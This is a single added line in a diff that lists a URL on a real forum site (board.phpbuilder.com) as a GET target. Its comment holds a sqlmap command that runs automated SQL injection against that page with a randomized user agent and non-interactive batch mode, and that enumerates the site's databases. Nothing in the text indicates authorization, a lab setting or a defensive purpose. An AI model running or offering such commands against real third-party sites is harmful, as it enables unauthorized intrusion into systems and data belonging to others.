@@ -1,0 +1,1 @@
+http://board.phpbuilder.com/board.php?id=1 (GET)  # sqlmap.py -u http://board.phpbuilder.com/board.php?id=1 --random-agent --batch --dbs
